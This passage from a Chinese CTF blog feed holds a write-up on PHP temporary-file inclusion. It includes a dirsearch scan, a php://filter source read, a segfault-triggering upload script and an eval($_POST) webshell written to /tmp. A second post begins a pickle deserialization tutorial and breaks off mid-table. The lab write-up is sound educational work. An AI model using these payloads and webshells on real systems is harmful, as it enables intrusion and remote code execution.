<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>

<p>扫描发现dir.php。</p>
<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
<p>访问dir.php文件：</p>
<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
<p>查看dir.php源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>

<p>用Burpsuite拦截响应，base64解码后源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
<p>编写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>执行该脚本后，payload就注入到临时文件了。</p>
<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
<p>题目源码（文件位于<code>index.php</code>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
<p>创建上传表单（<code>untitled.html</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://url/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>创建上传文件（<code>1.txt</code>）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
<p>打开上传表单，并上传</p>
<p>上传成功后找到路径</p>
<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
<p>包含</p>
<p><img src="https://s2.loli.net/2024/04/02/pd4ScAFLP7ThWr6.png" alt="8hvtMaESITi7Jd4"></p>
<p>输出 123 表示 1.txt 文件上传成功</p>
<p>关闭循环，找到木马文件路径</p>
<p><img src="https://s2.loli.net/2024/04/02/xgThuJoaliAfBV3.png" alt="nUJworM2IdKe4Eu"></p>
<p>输出 1234 表示一句话木马执行成功。接下来连蚁剑，找 flag。</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>python 反序列化学习记录</title>
    <url>/2024/03/20/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>前言：寒假的 hgame 2024 中有一道 python 反序列化的题，趁着复现的机会把 ta 给学学掉</p>
<h1 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h1><h2 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p>
<p>pickle 模块只能在 python 中使用， python 中几乎所有的数据类型（列表，字典，集合，类等）都可以用 pickle 来序列化，pickle 序列化后的数据，可读性差，人一般无法识别。</p>
<p>cPickle 模块是 C 语言实现， pickle 是纯 Python 实现，其他的差不多</p>
<h3 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h3><ul>
<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
</ul>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>) <span class="comment">#文件</span></span><br></pre></td></tr></table></figure>
<p>序列化对象，并将结果数据流写入到文件对象中。参数 protocol 是序列化模式，python2.x 默认值为 0 ，python3.x 中默认值为 3，表示以文本的形式序列化。 protocol 的值还可以是 1 或 2 ，表示以二进制的形式序列化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>) <span class="comment">#字符串</span></span><br></pre></td></tr></table></figure>

<p>将 python 数据转换为 pickle 格式的 bytes 字串。</p>
<p>当你想将在 python3.x 的序列化在 python2.x 中加载需要保证 protocol 参数不超过 3 。</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化 :"></a>反序列化 :</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>) <span class="comment">#文件</span></span><br></pre></td></tr></table></figure>

<p>反序列化对象。从 pickle 格式的文件中读取数据并转换为 python 对象。</p>
<p>可选关键字参数是 fix_imports、encoding 和 errors ，它们用于控制 python 2 生成的 pickle 流的兼容性支持。如果 fix_imports 为真，pickle 将尝试将旧的 python2 名称映射到 python3 中使用的新名称。encoding 和 errors 告诉 pickle 如何解码 python 2 pickle 的8位字符串实例；它们分别默认为 ASCII 和 strict 。encoding 可以是 byte，以便将这些8位字符串实例读取为字节对象。</p>
<p>其中要注意的是，在 <code>pickle.load(file)</code> 的时候，要让 python 能够找到类的定义，否则会报错。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(bytes_object, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>) <span class="comment">#字符串</span></span><br></pre></td></tr></table></figure>
<p>将 pickle 格式的 bytes 字串转换为 python 的类型。</p>
<p>以下为序列化和反序列化的结构示意图：</p>
<p><img src="https://s2.loli.net/2024/03/18/zUQDyETg42LZO91.png" alt="sp240318_150237"></p>
<h3 id="简单体验："><a href="#简单体验：" class="headerlink" title="简单体验："></a>简单体验：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">&quot;test&quot;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hello ! My friends&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/19/CqfNYwQ3hjEZznd.png" alt="image-20240318151801444"></p>
<p>另外有一点需要注意：对于我们自己定义的class，如果直接以形如<code>date = 20191029</code>的方式赋初值，<strong>则这个<code>date</code>不会被打包！</strong>解决方案是写一个<code>__init__</code>方法，但在输入的过程中编译器就会提醒你了：</p>
<p><img src="https://s2.loli.net/2024/03/18/Cz1a7IB4Hgp3wKc.png" alt="image-20240318170505162"></p>
<p>按个 Tab 键就行：</p>
<p><img src="https://s2.loli.net/2024/03/18/54jCbvoMUkzROFa.png" alt="image-20240318170605695"></p>
<h3 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h3><p>序列化的字符串是什么意思，又按照什么规则生成的，这就涉及到了 PVM 。</p>
<h4 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h4><p>对于 python 而言，它可以直接从源代码运行程序。 python 解释器会将源代码编译为字节码，然后将编译后的字节码转发到 python 虚拟机中执行。总的来说，PVM 的作用便是用来解释字节码的解释引擎。</p>
<p>pickle 是一门基于栈的编程语言，有不同的编写方式，其本质就是一个轻量级的 PVM 。这个轻量级的 PVM 由三部分组成：</p>
<h5 id="指令处理器-Instruction-processor"><a href="#指令处理器-Instruction-processor" class="headerlink" title="指令处理器 ( Instruction processor )"></a>指令处理器 ( Instruction processor )</h5><p>简称 I P</p>
<p>从数据流中读取操作码和参数，并对其进行解释处理。指令处理器会循环执行这个过程，不断改变 stack 和 memo 区域的值。直到遇到 <code>.</code> 这个结束符号。这时，最终停留在<strong>栈顶</strong>的值将会被作为反序列化对象返回。</p>
<h5 id="栈区-stack"><a href="#栈区-stack" class="headerlink" title="栈区 ( stack )"></a>栈区 ( stack )</h5><p>后进先出</p>
<p>由 Python 的列表 ( list ) 实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在<strong>栈顶</strong>生成反序列化的结果。</p>
<p>栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。</p>
<h5 id="内存区-memo"><a href="#内存区-memo" class="headerlink" title="内存区 ( memo )"></a>内存区 ( memo )</h5><p>由 Python 的字典 ( dict ) 实现，可以看作是数据索引或者标记，为 PVM 的整个生命周期提供存储功能。</p>
<p>简单来说就是将反序列化完成的数据以 key-value 的形式储存在 memo 中，以便使用。</p>
<h4 id="IP-常用的操作码："><a href="#IP-常用的操作码：" class="headerlink" title="IP 常用的操作码："></a>IP 常用的操作码：</h4><ul>
<li><p><code>c</code> : 读取本行的内容作为模块名 module，读取下一行的内容作为对象名 object，然后将 module.object 作为可调用对象压入到栈中。</p>
</li>
<li><p><code>(</code> : 将一个标记对象压入到栈中，用于确定命令执行的位置。该标记常常搭配 t 指令一起使用，以便产生一个元组。</p>
</li>
<li><p><code>S</code> : String，后面跟字符串，PVM 会读取引号中的内容，直到遇见<strong>换行符</strong>（<code>\n</code>），然后将读取到的内容压入到栈中。</p>
</li>
<li><p><code>I</code>：Int，后面跟数字。</p>
</li>
<li><p><code>t</code> : 从栈中不断弹出数据，弹射顺序与压栈时相同，直到弹出左括号。此时弹出的内容形成了一个元组，然后 , 该元组会被压入栈中。</p>
</li>
<li><p><code>R</code> : 将之前压入栈中的元组和可调用对象全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最后将结果压入到栈中。</p>
</li>
<li><p><code>.</code> : 结束整个 pickle 反序列化过程。</p>
</li>
</ul>
<p>过程演示：</p>
<p><img src="https://s2.loli.net/2024/03/18/KI6scO9bu5YWoPk.gif" alt="20200320230631-6204866e-6abc-1"></p>
<h4 id="object-reduce"><a href="#object-reduce" class="headerlink" title="object.__reduce__()"></a><code>object.__reduce__()</code></h4><p>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言， python 要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被 unpickle 时，该 callable（可被调用对象） 就会被调用以生成对象（该 callable 其实是构造函数）。</p>
<p>在 pickle 的 opcode 中，R 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 <code>object.__reduce__()</code> 函数，<code>object.__reduce__()</code> 的返回值会作为 R 的作用对象，当包含该函数的对象被 pickle 序列化时，得到的字符串是包含了 R 的。</p>
<p>过程演示：</p>
<p><img src="https://s2.loli.net/2024/03/18/BZbJmD19O3ksvUH.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
<p>这里的 <code>t</code> 可以消除 <code>(</code> 在栈中的 MARK 数据</p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>pickletools 是 python 自带的 pickle 调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;张三&quot;</span></span><br><span class="line">        self.message = [<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;18岁&#x27;</span>,<span class="string">&#x27;学生&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x = people()</span><br><span class="line">s = pickle.dumps(x,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\npeople\nq\x00)\x81q\x01&#125;q\x02</span><br><span class="line">(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00\xe5\xbc\xa0\xe4\xb8\x89q\x04X\x07\x00\x00\x00messageq\x05]</span><br><span class="line">q\x06(X\x03\x00\x00\x00\xe7\x94\xb7q\x07X\x05\x00\x00\x0018\xe5\xb2\x81q\x08X\x06\x00\x00\x00\xe5\xad\xa6\xe7\x94\x9fq\teub.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ people&#x27;</span><br><span class="line">   19: q    BINPUT     0</span><br><span class="line">   21: )    EMPTY_TUPLE</span><br><span class="line">   22: \x81 NEWOBJ</span><br><span class="line">   23: q    BINPUT     1</span><br><span class="line">   25: &#125;    EMPTY_DICT</span><br><span class="line">   26: q    BINPUT     2</span><br><span class="line">   28: (    MARK</span><br><span class="line">   29: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   38: q        BINPUT     3</span><br><span class="line">   40: X        BINUNICODE &#x27;张三&#x27;</span><br><span class="line">   51: q        BINPUT     4</span><br><span class="line">   53: X        BINUNICODE &#x27;message&#x27;</span><br><span class="line">   65: q        BINPUT     5</span><br><span class="line">   67: ]        EMPTY_LIST</span><br><span class="line">   68: q        BINPUT     6</span><br><span class="line">   70: (        MARK</span><br><span class="line">   71: X            BINUNICODE &#x27;男&#x27;</span><br><span class="line">   79: q            BINPUT     7</span><br><span class="line">   81: X            BINUNICODE &#x27;18岁&#x27;</span><br><span class="line">   91: q            BINPUT     8</span><br><span class="line">   93: X            BINUNICODE &#x27;学生&#x27;</span><br><span class="line">  104: q            BINPUT     9</span><br><span class="line">  106: e            APPENDS    (MARK at 70)</span><br><span class="line">  107: u        SETITEMS   (MARK at 28)</span><br><span class="line">  108: b    BUILD</span><br><span class="line">  109: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>

<p>优化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;张三&quot;</span></span><br><span class="line">        self.message = [<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;18岁&#x27;</span>,<span class="string">&#x27;学生&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x = people()</span><br><span class="line">s = pickle.dumps(x,protocol=<span class="number">3</span>)</span><br><span class="line">s = pickletools.optimize(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\npeople\n)\x81&#125;(X\x04\x00\x00\x00nameX\x06\x00\x00\x00\xe5\xbc\xa0\xe4\xb8\x89X\x07\x00\x00\x00message](X\x03\x00\x00\x00\xe7\x94\xb7X\x05\x00\x00\x0018\xe5\xb2\x81X\x06\x00\x00\x00\xe5\xad\xa6\xe7\x94\x9feub.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ people&#x27;</span><br><span class="line">   19: )    EMPTY_TUPLE</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: &#125;    EMPTY_DICT</span><br><span class="line">   22: (    MARK</span><br><span class="line">   23: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   32: X        BINUNICODE &#x27;张三&#x27;</span><br><span class="line">   43: X        BINUNICODE &#x27;message&#x27;</span><br><span class="line">   55: ]        EMPTY_LIST</span><br><span class="line">   56: (        MARK</span><br><span class="line">   57: X            BINUNICODE &#x27;男&#x27;</span><br><span class="line">   65: X            BINUNICODE &#x27;18岁&#x27;</span><br><span class="line">   75: X            BINUNICODE &#x27;学生&#x27;</span><br><span class="line">   86: e            APPENDS    (MARK at 56)</span><br><span class="line">   87: u        SETITEMS   (MARK at 22)</span><br><span class="line">   88: b    BUILD</span><br><span class="line">   89: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>

<p>可以看到，字符串<code>s</code>比以前短了很多，而且反汇编结果中，<code>BINPUT</code>指令没有了。所谓“优化”，其实就是把不必要的<code>PUT</code>指令给删除掉。这个<code>PUT</code>意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个 class 并不需要这个操作，可以省略掉这些<code>PUT</code>指令。利用 pickletools ，我们能很方便地看清楚每条语句的作用、检验我们手动构造出的字符串是否合法等</p>
<h2 id="快速寻找-pickle-源码位置"><a href="#快速寻找-pickle-源码位置" class="headerlink" title="快速寻找 pickle 源码位置"></a>快速寻找 pickle 源码位置</h2><p>在终端的 python 交互式环境中执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="built_in">print</span>(pickle.__file__)</span><br></pre></td></tr></table></figure>

<h2 id="pickle-指令"><a href="#pickle-指令" class="headerlink" title="pickle 指令"></a>pickle 指令</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>pickle由于有不同的实现版本，在 python3 和 python2 中得到的 opcode 不相同。但是 pickle 可以向下兼容（所以用 v0 就可以在所有版本中执行）。目前，pickle 有 6 种版本。在pickle.loads时，可以用Protocol参数指定协议版本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>) </span><br><span class="line"><span class="comment">#在Python中，&#123;a!r&#125; 这样的语法表示对变量a使用!r格式化选项进行格式化输出。在这种情况下!r表示使用repr()函数来获取变量a的表示形式，这样可以获得变量a的原始形式，包括引号和转义字符。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原变量：&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;</span><br><span class="line">pickle版本0 b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span><br><span class="line">pickle版本1 b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br><span class="line">pickle版本2 b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br><span class="line">pickle版本3 b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br></pre></td></tr></table></figure>

<p>目前这些协议有 0,2,3,4 号版本，默认为 3 号版本。这所有版本中，0 号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。<strong>pickle 协议是向前兼容的</strong>。0 号版本的字符串可以直接交给 <code>pickle.loads()</code> ，不用担心引发什么意外。刚刚说过，字符串中包含了很多条指令。这些指令一定以<strong>一个字节</strong>的指令码（<code>opcode</code>）开头；接下来读取多少内容，由指令码来决定（严格规定了读取几个参数、参数的结束标志符等）。<strong>指令编码是紧凑的</strong>，一条指令结束之后立刻就是下一条指令。</p>
<h3 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h3><p>常用的指令如下：</p>
<table>
<thead>
<tr>
<th align="center">opcode</th>
<th align="center">描述</th>
<th align="center">具体写法</th>
<th align="center">栈上的变化</th>
<th align="center">memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td align="center">c</td>
<td align="center">获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td align="center">c[module]\n[instance]\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td align="center">o</td>
<td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td align="center">i[module]\n[callable]\n</td>
<td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">实例化一个None</td>
<td align="center">N</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">实例化一个字符串对象</td>
<td align="center">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">实例化一个UNICODE字符串对象</td>
<td align="center">Vxxx\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">实例化一个int对象</td>
<td align="center">Ixxx\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">实例化一个float对象</td>
<td align="center">Fx.x\n</td>
<td align="center">获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td align="center">R</td>
<td align="center">函数和参数出栈，函数的返回值入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td align="center">.</td>
<td align="center">无</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">(</td>
<td align="center">向栈中压入一个MARK标记</td>
<td align="center">(</td>
<td align="center">MARK标记入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">t</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td align="center">t</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">)</td>
<td align="center">向栈中直接压入一个空元组</td>
<td align="center">)</td>
<td align="center">空元组入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td align="center">l</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">]</td>
<td align="center">向栈中直接压入一个空列表</td>
<td align="center">]</td>
<td align="center">空列表入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td align="center">d</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">}</td>
